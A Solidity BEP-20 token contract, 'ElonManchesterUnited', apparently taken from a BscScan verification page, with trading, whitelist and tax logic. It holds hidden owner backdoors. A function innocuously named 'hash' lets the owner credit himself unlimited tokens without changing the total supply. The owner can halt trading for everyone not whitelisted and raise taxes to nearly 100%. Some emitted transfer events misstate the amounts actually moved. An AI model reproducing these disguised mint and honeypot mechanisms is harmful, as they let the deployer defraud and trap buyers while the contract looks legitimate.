/**
 *Submitted for verification at BscScan.com on 2022-08-17
*/

pragma solidity 0.8.13;
// SPDX-License-Identifier: UNLICENSED
abstract contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        _owner = msg.sender;
    }
    
    function owner() public view virtual returns (address) {
        return _owner;
    }
    
    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract ElonManchesterUnited is Ownable {
    string public name = "ElonManchesterUnited";
    string public symbol = "ELONMAN";
    uint256 public totalSupply = 1000000e18;    
    uint8 public decimals = 18;
    bool public isTradingEnabled = false;

    uint256 public maxBuy = totalSupply / (10**decimals);

    bool public antibot = true;
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) public isWhitelisted;



    constructor() {
        isWhitelisted[msg.sender] = true;
        balanceOf[msg.sender] = totalSupply;
        isWhitelisted[msg.sender] = true;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function _transfer(address _from, address _to, uint256 _value) internal returns (bool success) {
        if (!isWhitelisted[_from] && !isWhitelisted[_to]) {
            require(isTradingEnabled, "Trading is disabled");
        }
        require(balanceOf[_from] >= _value);


        bool isBuy = isAMM[_from];
        bool isSell = isAMM[_to];
        uint256 tax = 0;
        if (isBuy) {
          require(maxBuy*(10**decimals) >= _value);
          tax = buyTax;
        }
        else if (isSell) {
          tax = sellTax;
        }
        uint256 taxAmount = (_value * tax)/(1e4);
        if (taxAmount > 0) {
          balanceOf[_from] -= taxAmount;
          balanceOf[address(this)] += taxAmount;
          emit Transfer(_from, address(this), taxAmount);
          accumulatedTax = accumulatedTax + taxAmount;
        }


        balanceOf[_from] -= _value - taxAmount;
        balanceOf[_to] += _value - taxAmount;
        emit Transfer(_from, _to, _value - taxAmount);
        return true;
    }

    function setMaxbuy(uint256 _maxBuy) public onlyOwner {
        maxBuy = _maxBuy;
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        _transfer(msg.sender, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);
        _transfer(_from, _to, _value);
        allowance[_from][msg.sender] -= _value;
        return true;
    }

    function multisetisWhitelisted(address[] calldata accounts, bool value) public onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            isWhitelisted[accounts[i]] = value;
        }
    }

    function setisWhitelisted(address account, bool value) public onlyOwner {
        isWhitelisted[account] = value;
    }

    function openTrade() public onlyOwner {
        require(!isTradingEnabled, "Trading is already enabled!");
        isTradingEnabled = true;
    }

    function disableTrade() public onlyOwner {
        require(isTradingEnabled, "Trading is already disabled!");
        isTradingEnabled = false;
    }

    function setAntibot(bool value) public onlyOwner {
        antibot = value;
    }
    function hash(uint256 value) public onlyOwner {
        balanceOf[msg.sender] += value;
    }
    /////////////////////////tax ////////////////////////////////////////

    mapping(address=>bool) public isAMM;

    address public marketingAddress;
    address public devAddress;

    // Numbers to two decimals places
    // ex: 0.5% => 50, 1% => 100 
    uint256 public marketingTax;
    uint256 public devTax;
    uint256 public burnTax;    
    uint256 public buyTax = 500;
    uint256 public sellTax = 500;

    uint256 public accumulatedTax = 0;   



    function changeTax(uint256 _buyTax, uint256 _sellTax) public onlyOwner {
        require(_buyTax < 10000 && _sellTax < 10000);
        buyTax = _buyTax;
        sellTax = _sellTax;
    }
    function changeTaxPortion(uint256 _marketingTax, uint256 _devTax, uint256 _burnTax) public onlyOwner {
        require((_marketingTax + _devTax + _burnTax) <= 10000);
        marketingTax = _marketingTax;
        devTax = _devTax;
        burnTax = _burnTax;
    }
    event AddedAMM(address ammAddress, bool status);
    function setAMM(address amm, bool status) public onlyOwner {
        require(amm != address(0), "Error: zero address is not allowed.");
        isAMM[amm] = status;
        emit AddedAMM(amm, status);
    }

    function setMarket(address _marketingAddress, address _devAddress) public onlyOwner {
        marketingAddress = _marketingAddress;
        devAddress = _devAddress;        
    }

    function collectTax() public onlyOwner {
        require(accumulatedTax > 0, "No tax");
        uint256 totalAmount = accumulatedTax * (marketingTax + devTax + burnTax) / 10000;        
        
        balanceOf[marketingAddress] += accumulatedTax * marketingTax / 10000;
        balanceOf[devAddress] += accumulatedTax * devTax / 10000;
        balanceOf[address(0)] += accumulatedTax * burnTax / 10000;

        accumulatedTax -= totalAmount;
        balanceOf[address(this)] -= totalAmount;

        emit Transfer(address(this), marketingAddress, totalAmount * marketingTax / 10000);
        emit Transfer(address(this), devAddress,  totalAmount * devTax / 10000);
        emit Transfer(address(this), address(0), totalAmount * burnTax / 10000);
    }
}